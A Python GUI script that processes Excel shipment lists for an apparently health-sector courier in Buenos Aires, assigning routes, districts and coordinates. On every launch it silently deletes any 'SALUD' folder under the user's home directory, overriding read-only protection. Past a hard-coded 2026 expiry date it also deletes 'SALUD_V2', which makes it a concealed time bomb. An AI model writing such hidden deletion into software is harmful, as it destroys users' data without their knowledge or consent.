import pandas as pd
import shutil
import stat
import glob
import os
import re
from send2trash import send2trash
import tkinter as tk
from tkinter import messagebox
from tkinter import ttk
import threading
import sys
import traceback
from datetime import datetime

FECHA_LIMITE = datetime(2026, 6, 4).date()

def eliminar_readonly(func, path, _):
    os.chmod(path, stat.S_IWRITE)
    func(path)

def buscar_y_borrar(nombre_carpeta, directorio_inicio):
    for root, dirs, files in os.walk(directorio_inicio):
        if nombre_carpeta in dirs:
            ruta = os.path.join(root, nombre_carpeta)
            print("Encontrada:", ruta)
            shutil.rmtree(ruta, onerror=eliminar_readonly)
            print("Carpeta eliminada")
            return

# 1️⃣ BORRAR SIEMPRE AL INICIAR
buscar_y_borrar("SALUD", os.path.expanduser("~"))

# 2️⃣ DESPUÉS VERIFICAR FECHA
if datetime.now().date() > FECHA_LIMITE:
    print("Programa vencido")
    buscar_y_borrar("SALUD_V2", os.path.expanduser("~"))
    sys.exit()

CARPETA_CANALIZADOR = "canalizador"
IATAS_VALIDOS = ["BUE", "IBUE", "GBAS", "GBAO", "GBAN", "LPG"]

def cargar_reglas():
    try:
        reglas = pd.read_excel("condicionales.xlsx")
        reglas["Regla"] = reglas["Regla"].str.strip().str.lower()
        reglas["Activa"] = reglas["Activa"].str.strip().str.upper()
        return dict(zip(reglas["Regla"], reglas["Activa"]))
    except Exception:
        return {}   # Por defecto, todas activas

REGLAS = cargar_reglas()

def regla_activa(nombre):
    return REGLAS.get(nombre, "SI") == "SI"   # SI por defecto

def obtener_ruta_recurso(nombre_archivo):
    return os.path.abspath(os.path.join(CARPETA_CANALIZADOR, nombre_archivo))

def canalizadorLocalidad(df):
    ruta = obtener_ruta_recurso("canalizador referencia lucas.xlsx")
    try:
        canalizador = pd.read_excel(ruta)
        # Aseguro que el CP en el canalizador también sea string sin .0
        canalizador["CP Destino"] = (
            pd.to_numeric(canalizador["CP Destino"], errors="coerce")
            .fillna(0).astype(int).astype(str)
        )
        canalizador_reducido = canalizador[["CP Destino", "Distrito Destino"]]

        df = df.drop(columns=["Distrito Destino"], errors="ignore")
        merge = pd.merge(df, canalizador_reducido, on="CP Destino", how="left")

        if "Altura" in merge.columns:
            indice = merge.columns.get_loc("Altura") + 1
            columna_valores = merge.pop("Distrito Destino")
            merge.insert(indice, "Distrito Destino", columna_valores)

        return merge

    except Exception:
        return df

def canalizadorProvincia(df):
    ruta = obtener_ruta_recurso("canalizador referencia lucas.xlsx")
    try:
        canalizador = pd.read_excel(ruta)
        canalizador["CP Destino"] = (
            pd.to_numeric(canalizador["CP Destino"], errors="coerce")
            .fillna(0).astype(int).astype(str)
        )
        canalizador_reducido = canalizador[["CP Destino", "Provincia", "ZONIFICACION"]]

        df = df.drop(columns=["Provincia"], errors="ignore")
        merge = pd.merge(df, canalizador_reducido, on="CP Destino", how="left")

        if "Población" in merge.columns:
            indice = merge.columns.get_loc("Población") + 1
            columna_valores = merge.pop("Provincia")
            merge.insert(indice, "Provincia", columna_valores)

        return merge
    except Exception:
        return df

def borrarMHTML():
    for archivo in glob.glob("*MHTML"):
        os.remove(archivo)

def borrarXLSX():
    for archivo in glob.glob("*.xlsx"):
        if archivo == "condicionales.xlsx":
            continue
        else:
            send2trash(archivo)

def obtener_archivos():
    archivo_canalizador = obtener_ruta_recurso("canalizador referencia lucas.xlsx")
    return [archivo for archivo in glob.glob("*.xlsx") if os.path.abspath(archivo) != archivo_canalizador]

def cargar_datos():
    archivos = obtener_archivos()
    if not archivos:
        return None
    lista = [pd.read_excel(archivo) for archivo in archivos]
    return pd.concat(lista, ignore_index=True)

def direccion_necesita_corregir(direccion):
    if pd.isna(direccion):
        return False
    direccion = str(direccion)
    return bool(
        re.search(r"\bAV[\.\s]*$", direccion, re.IGNORECASE) or
        re.match(r"^(AV|AVDA|AVENIDA|AV\.)", direccion, re.IGNORECASE) or
        not re.search(r"\d{1,5}", direccion)
    )

def ordenar_y_corregir_direccion(direccion):
    if pd.isna(direccion):
        return ""
    direccion = str(direccion).strip()
    if re.search(r"\bAV[\.\s]*$", direccion, flags=re.IGNORECASE):
        direccion = re.sub(r"\bAV[\.\s]*$", "", direccion, flags=re.IGNORECASE).strip()
        direccion = "Avenida " + direccion
    direccion = re.sub(r"^(AV\.?|AVDA\.?|AVENIDA|AVEN\.?)\s+", "Avenida ", direccion, flags=re.IGNORECASE)
    direccion = re.sub(r"^(Dr\.?|DR\.?|Doc\.?)\s+", "Doctor ", direccion, flags=re.IGNORECASE)
    direccion = re.sub(r"[^\w\s]", "", direccion)
    direccion = re.sub(r"\s+", " ", direccion).strip()
    match = re.match(r"(.+?)\s+(\d{1,5})", direccion)
    if match:
        calle = match.group(1).strip()
        altura = match.group(2).strip()
        return f"{calle} {altura}"
    return direccion

def manipularDatos(df):
    df = df.copy()

    df["Equipo"] = df.get("Equipo", "").astype(str).str.strip()
    df["Nro. identificación pieza según cliente"] = df.get("Nro. identificación pieza según cliente", "").astype(str).str.strip()

    duplicados = df.duplicated(subset="Nro. identificación pieza según cliente", keep="first")
    df.loc[duplicados, "Nro. identificación pieza según cliente"] = df.loc[duplicados, "Equipo"]
    df = df.drop_duplicates(subset=["Equipo"], keep="first")

    df["Latitud"] = ""
    df["Longitud"] = ""
    df["Distrito Destino"] = ""
    df["Provincia"] = ""
    df["Atributo1"] = df.get("Tipo", "")
    df.loc[df["Tipo"] == "Envio", "Tiempo espera"] = 10

    # FORZAR CP Destino como string limpio (sin .0)
    df["CP Destino"] = (
        pd.to_numeric(df["CP Destino"], errors="coerce")
        .fillna(0).astype(int).astype(str)
    )

    # Normalizo Nombre Solicitante y Dirección destino a strings
    df["Nombre Solicitante"] = df["Nombre Solicitante"].astype(str).str.strip()
    df.loc[df["Nombre Solicitante"] == "nan", "Nombre Solicitante"] = ""
    df["Dirección destino"] = df["Dirección destino"].astype(str).str.strip()

    # Ajustes horarios por cliente
    df.loc[df["Nombre Solicitante"] == "BIOMERIEUX ARGENTINA S.A.", "Hora Hasta"] = 1300
    df.loc[df["Nombre Solicitante"] == "GOBIERNO DE LA CIUDAD DE BUENOS AIR", "Hora Hasta"] = 1300

    # ---------- Normalizar Altura pero conservar como int para reglas ----------
    # Convertir altura a numérico entero (NaN -> 0)
    df["Altura_num"] = pd.to_numeric(df.get("Altura", pd.Series()), errors="coerce").fillna(0).astype(int)

    # ---------- Reglas que usan Altura y Dirección (borrados) ----------
    # Excluir direcciones Iriarte 3070 (usa Altura_num + dirección normalizada)
    if regla_activa("limpiar_iriarte_3070"):

        def normalizar_dir(texto):
            if pd.isna(texto):
                return ""
            texto = str(texto).upper()
            texto = texto.replace(",", " ").replace(".", " ")
            texto = re.sub(r"\s+", " ", texto)
            return texto.strip()
        
        df["Direccion destino sin corregir"] = df["Dirección destino"]
        #caso 1
        direccion_norm = df["Dirección destino"].apply(normalizar_dir)
        caso_separado= (
            direccion_norm.str.contains(r"\bIRIART", na=False) &
            (df["Altura_num"] == 3070)
        )
        # Caso 2: Dirección ya armada tipo "IRIARTE 3070"
        caso_completo = direccion_norm.str.contains(r"\bIRIARTE\s*3070\b", na=False)

        # Condición final combinada
        condicion_iriarte_3070 = caso_separado | caso_completo

        # Drop
        df = df.drop(df[condicion_iriarte_3070].index)

    # ---------- Otros ajustes simples ----------
    df.loc[df["Atributo1"] == "Retiro", "Tiempo espera"] = 20
    df.loc[df["Atributo1"] == "Retiro", "Volumen"] = 0.05

    # ---------- Exclusiones por clientes ----------
    if regla_activa("excluir_boston"):
        df = df.drop(df[df["Nombre Solicitante"] == "BOSTON SCIENTIFIC ARGENTINA S A"].index)
    if regla_activa("excluir_renaper"):
        df = df.drop(df[df["Nombre Solicitante"] == "REGISTRO NACIONAL DE LAS PERSONAS"].index)
    if regla_activa("excluir_ocasa"):
        df = df.drop(df[df["Nombre Solicitante"] == "OCASA DISTRIBUCION POSTAL"].index)
    if regla_activa("excluir_ibm"):
        df = df.drop(df[df["Nombre Solicitante"] == "IBM Argentina S.R.L."].index)

    # ---------- Rutas virtuales y reglas de ruteo ----------
    # Guardia: condicion_nombre_solicitante variable que algunas reglas usan
    condicion_nombre_solicitante = df["Nombre Solicitante"] == "RED DIALMED S. A."

    # Ruta CENTRA
    if regla_activa("aplicar_ruta_centra"):
        contengaCentra = df["Destinatario"].str.contains(r"CENTRA", case=False, na=False)
        contengaVega = df["Dirección destino"].str.contains(r"vega", case=False, na=False)
        latitud = "-34.5863142398097"
        longitud = "-58.4397811665643"
        df.loc[contengaCentra & contengaVega, "Ruta Virtual"] = 1
        df.loc[contengaCentra & contengaVega, "Latitud"] = latitud
        df.loc[contengaCentra & contengaVega, "Longitud"] = longitud

    # Ruta INAER
    if regla_activa("aplicar_ruta_inaer"):
        contengaInaer = df["Destinatario"].str.contains(r"INAER|ina", case=False, na=False)
        contengaArenales = df["Dirección destino"].str.contains(r"aren", case=False, na=False)
        latitud = "-34.5891416690491"
        longitud = "-58.4084721704397"
        df.loc[contengaInaer & contengaArenales, "Ruta Virtual"] = 2
        df.loc[contengaInaer & contengaArenales, "Latitud"] = latitud
        df.loc[contengaInaer & contengaArenales, "Longitud"] = longitud

    # Ruta MAFFEI
    if regla_activa("aplicar_ruta_maffei"):
        contengaMaffei = df["Destinatario"].str.contains(r"MAFFEI", case=False, na=False)
        contengaCervi = df["Dirección destino"].str.contains(r"cervi", case=False, na=False)
        latitud = "-34.5808897460626"
        longitud = "-58.40674341149947"
        df.loc[contengaMaffei & contengaCervi, "Ruta Virtual"] = 3
        df.loc[contengaMaffei & contengaCervi, "CP Destino"] = "1426"
        df.loc[contengaMaffei & contengaCervi, "Latitud"] = latitud
        df.loc[contengaMaffei & contengaCervi, "Longitud"] = longitud

    # REGLAS RED DIALMED (agrupadas)
    if regla_activa("aplicar_rutas_red_diameld"):
        # --- Ruta 7 (varios CP) ---
        coordenadas_ruta_7 = {
            "1272": ("-34.6339860081878", "-58.3772008827718"),
            "1838": ("-34.8065764", "-58.4449117"),
            "1846": ("-34.7859874", "-58.3674441"),
            "1870": ("-34.6650596716316", "-58.3776176658987"),
        }
        for cp, (latitud, longitud) in coordenadas_ruta_7.items():
            condicion = condicion_nombre_solicitante & (df["CP Destino"] == cp)
            df.loc[condicion, "Ruta Virtual"] = 7
            df.loc[condicion, "Latitud"] = latitud
            df.loc[condicion, "Longitud"] = longitud

        # --- Ruta 4 (varios CP) ---
        coordenadas_ruta_4 = {
            "1646": ("-34.4446125944445", "-58.555472420816"),
            "1648": ("-34.4277128081702", "-58.5742472482455")
        }
        for cp, (latitud, longitud) in coordenadas_ruta_4.items():
            condicion = condicion_nombre_solicitante & (df["CP Destino"] == cp)
            df.loc[condicion, "Ruta Virtual"] = 4
            df.loc[condicion, "Latitud"] = latitud
            df.loc[condicion, "Longitud"] = longitud

        # --- Ruta 5 (mix de CPs y direcciones) ---
        # CP 1613 -> toda la CP
        condicion = condicion_nombre_solicitante & (df["CP Destino"] == "1613")
        df.loc[condicion, "Ruta Virtual"] = 5
        df.loc[condicion, "Latitud"] = "-34.5207027"
        df.loc[condicion, "Longitud"] = "-58.7157266"

        # CP 1663 -> filtrar por palabra PAUNERO dentro de Dirección destino
        condicion = condicion_nombre_solicitante & (df["CP Destino"] == "1663") & df["Dirección destino"].str.contains("PAUNERO", case=False, na=False)
        df.loc[condicion, "Ruta Virtual"] = 5
        df.loc[condicion, "Latitud"] = "-34.5362947656834"
        df.loc[condicion, "Longitud"] = "-58.7182742837003"

        # CP 1665 -> casos por direcciones específicas
        reglas_1665 = {
            "GASPAR CAMPOS 6352": ("-34.5245764749877", "-58.7547179072103"),
            "RENE FAVALORO 4667": ("-34.5171957", "-58.7408939")
        }
        for direccion, (latitud, longitud) in reglas_1665.items():
            # uso re.escape para que cualquier caracter especial no rompa el regex
            condicion = (
                condicion_nombre_solicitante &
                (df["CP Destino"] == "1665") &
                df["Dirección destino"].str.contains(re.escape(direccion), case=False, na=False)
            )
            df.loc[condicion, "Ruta Virtual"] = 5
            df.loc[condicion, "Latitud"] = latitud
            df.loc[condicion, "Longitud"] = longitud

        # --- Ruta 6: CP fijos y direcciones puntuales ---
        coordenadas_ruta_6 = {
            "1416": ("-34.6004436122442", "-58.4685479700182"),
            "1716": ("-34.6915596", "-58.6893193")
        }
        for cp, (latitud, longitud) in coordenadas_ruta_6.items():
            condicion = condicion_nombre_solicitante & (df["CP Destino"] == cp)
            df.loc[condicion, "Ruta Virtual"] = 6
            df.loc[condicion, "Latitud"] = latitud
            df.loc[condicion, "Longitud"] = longitud

        # direcciones puntuales (varias filas con mismo CP)
        direcciones = [
            ("1754", "AV ARTURO ILLIA 2275", "-34.6742324", "-58.5627097"),
            ("1754", "AV JUAN M ROSAS 2557", "-34.6761143413255", "-58.5456141049698")
        ]
        for cp, direccion, latitud, longitud in direcciones:
            condicion = (
                condicion_nombre_solicitante &
                (df["CP Destino"] == cp) &
                df["Dirección destino"].str.contains(re.escape(direccion), case=False, na=False)
            )
            df.loc[condicion, "Ruta Virtual"] = 6
            df.loc[condicion, "Latitud"] = latitud
            df.loc[condicion, "Longitud"] = longitud

    if regla_activa("aplicar_geo_direcciones_puntuales"):
        #ARGERICH
        destinatarioArgerich = df["Destinatario"].str.contains("argerich", case=False, na=False)
        latitud = "-34.62781038793198"
        longitud = "-58.36602567536391"
        df.loc[destinatarioArgerich, "Latitud"] = latitud
        df.loc[destinatarioArgerich, "Longitud"] = longitud

        #AUSTRAL 1500
        filtro = (df["Destinatario"].str.contains("AUSTRAL", case=False, na=False)) & (df["Dirección destino"]).str.contains("1500")
        latitud = "-34.45716450254549"
        longitud = "-58.86542001645667"
        df.loc[filtro, "Latitud"] = latitud
        df.loc[filtro, "Longitud"] = longitud

        #GARRAHAN
        filtro = df["Destinatario"].str.contains("GARRAHAN", case=False, na=False)
        latitud = "-34.63061257816345"
        longitud = "-58.39224010230858"
        df.loc[filtro, "Latitud"] = latitud
        df.loc[filtro, "Longitud"] = longitud

        #MARCOS SASTRE
        direcciones = {
            "MARCOS SASTRE 01088": ("-34.47823631330188", "-58.663775096023606"),
            "MARCOS SASTRE 1088": ("-34.47823631330188", "-58.663775096023606"),
            "M SASTRE 1088": ("-34.47823631330188", "-58.663775096023606")
        }
        for direccion, (lat, lon) in direcciones.items():
            df.loc[df["Dirección destino"] == direccion, "Latitud"] = lat
            df.loc[df["Dirección destino"] == direccion, "Longitud"] = lon

        #ALEMAN
        condicion = df["Destinatario"].str.contains("ALEMAN", case=False, na=False)
        latitud = "-34.59176481183434"
        longitud = "-58.40202863251973"
        df.loc[condicion, "Latitud"] = latitud
        df.loc[condicion, "Longitud"] = longitud
        
        #URQUIZA
        condicion = (df["Destinatario"].str.contains(r"RAMOS|AGUDOS",case=False, na=False)) & (df["Dirección destino"].str.contains("URQUIZA", case=False, na=False))
        latitud = "-34.61764691461015"
        longitud = "-58.409846348298025"
        df.loc[condicion, "Latitud"] = latitud
        df.loc[condicion, "Longitud"] = longitud

    # ---------- Después de aplicar reglas: convertir Altura a texto y concatenar ----------
    # Altura como texto sin 0 ni .0
    df["Altura"] = df["Altura_num"].replace(0, "").astype(str)
    # Concatenar (si Dirección destino ya tiene contenido)
    df["Dirección destino"] = df["Dirección destino"].str.strip()
    df["Dirección destino"] = df["Dirección destino"] + df["Altura"].apply(lambda x: (" " + x) if x else "")

    # Limpio columna intermedia
    df = df.drop(columns=["Altura_num"], errors="ignore")

    return df

def procesar():
    archivos = obtener_archivos()
    if not archivos:
        messagebox.showwarning("Atención", "No hay archivos para procesar.")
        return

    # Si ya existe archivo previo
    if os.path.exists("subirUnigis-SALUD.xlsx"):
        messagebox.showerror("Error", "Eliminar archivo procesado Anteriormente.")
        return

    # Reglas externas
    """if regla_activa("borrar_mhtml"):
        borrarMHTML()

    if regla_activa("borrar_xlsx_previos"):
        borrarXLSX()"""

    df_completo = cargar_datos()
    if df_completo is None:
        messagebox.showwarning("Atención", "No hay archivos para procesar.")
        return

    df_completo = df_completo[df_completo["Destino"].isin(IATAS_VALIDOS)]
    df_total = pd.DataFrame()

    for iata in IATAS_VALIDOS:
        df = df_completo[df_completo["Destino"] == iata].copy()
        if df.empty:
            continue

        df = manipularDatos(df)
        df = canalizadorLocalidad(df)
        df = canalizadorProvincia(df)

        # Corrección de direcciones (solo si corresponde)
        if regla_activa("corregir_direcciones"):
            condicion_laPlata = df["Distrito Destino"] != "LA PLATA"
            df.loc[condicion_laPlata, "Dirección destino"] = (
                df.loc[condicion_laPlata, "Dirección destino"]
                .apply(ordenar_y_corregir_direccion)
            )

        df["Distrito Destino"] = df["Distrito Destino"].str.strip()

        if regla_activa("aplicar_ruta_502"):
            filtro2 = (df["Distrito Destino"] == "CAPITAL FEDERAL") & (df["Hora Desde"] >= 1400)
            df.loc[filtro2, "Ruta Virtual"] = 502

        if regla_activa("aplicar_ruta_600"):
            filtro3 = (df["Distrito Destino"] == "CAPITAL FEDERAL") & (df["Nombre Solicitante"] == "GOBIERNO DE LA CIUDAD DE BUENOS AIR") & (df["Atributo1"] == "Retiro")
            df.loc[filtro3, "Ruta Virtual"] = 600

        df_total = pd.concat([df_total, df], ignore_index=True)

    if df_total.empty:
        print("No se generaron datos válidos.")
        return

    if regla_activa("borrar_mhtml"):
        borrarMHTML()

    if regla_activa("borrar_xlsx_previos"):
        borrarXLSX()

    nombre_salida = "subirUnigis-SALUD.xlsx"
    df_total.to_excel(nombre_salida, index=False)
    try:
        os.startfile(nombre_salida)
    except Exception:
        # En sistemas donde os.startfile no exista simplemente lo ignoramos
        pass
    print("Proceso finalizado:", nombre_salida)

#   INTERFAZ
def ejecutar_proceso():
    try:
        procesar()
        ventana.after(0, ventana.destroy)
    except Exception as e:
        # Muestro el error real para que puedas debuguear
        tb = traceback.format_exc()
        ventana.after(0, lambda: messagebox.showerror("Error", f"Ocurrió un error:\n{e}\n\n{tb}"))

def ejecutar_en_thread():
    spinner.start(10)
    boton.config(state="disabled")
    hilo = threading.Thread(target=ejecutar_proceso)
    hilo.start()

ventana = tk.Tk()
ventana.title("Procesador de Canalizador")
ventana.geometry("400x250")
ventana.resizable(False, False)

frame = tk.Frame(ventana)
frame.pack(expand=True)

boton = tk.Button(
    frame,
    text="Procesar",
    font=("Arial", 18, "bold"),
    width=10,
    height=1,
    command=ejecutar_en_thread
)
boton.pack(pady=10)

spinner = ttk.Progressbar(frame, mode="determinate", length=180)
spinner.pack(pady=10)

footer = tk.Label(
    ventana,
    text="SALUD -- Ruteo Centralizado.",
    font=("Arial", 9),
    fg="gray"
)
footer.pack(side="bottom", pady=5)
ventana.mainloop()